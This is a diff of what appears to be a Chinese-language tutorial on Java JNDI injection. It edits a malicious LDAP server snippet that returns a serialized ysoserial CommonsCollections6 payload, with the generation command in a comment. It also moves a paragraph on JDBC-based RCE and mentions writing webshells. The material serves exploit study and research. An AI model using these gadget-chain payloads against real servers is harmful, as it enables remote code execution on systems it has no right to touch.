@@ -423,15 +423,7 @@ public class RMIServer {
 ```java title="LDAP Server"
 
 protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
-    URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-    System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
     e.addAttribute("javaClassName", "foo");
-    String cbstring = this.codebase.toString();
-    int refPos = cbstring.indexOf('#');
-    if ( refPos > 0 ) {
-        cbstring = cbstring.substring(0, refPos);
-    }
-
     try {
         // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
         e.addAttribute("javaSerializedData",Base64.decode(payload));
@@ -780,9 +772,8 @@ RCE的方法有两种，分别是覆盖 tomcat-users.xml 和写 webshell
     ```
 
 ###  JDBC RCE
-ObjectFactory 的实现类里有好几个类都是用来实例化数据源的，如果能够触发数据库连接，那就可以用 jdbc 来 RCE。参考[《Make JDBC Attacks Brilliant Again》](https://conference.hitb.org/hitbsecconf2021sin/sessions/make-jdbc-attacks-brilliant-again/){target=_blank}根据classpath下有哪些可用的jdbc驱动构造出对应的 payload。
 
-[Todo](/todo)
+ObjectFactory 的实现类里有好几个类都是用来实例化数据源的，如果能够触发数据库连接，那就可以用 jdbc 来 RCE。参考[《Make JDBC Attacks Brilliant Again》](https://conference.hitb.org/hitbsecconf2021sin/sessions/make-jdbc-attacks-brilliant-again/){target=_blank}根据classpath下有哪些可用的jdbc驱动构造出对应的 payload。
 
 ## 参考资料
 
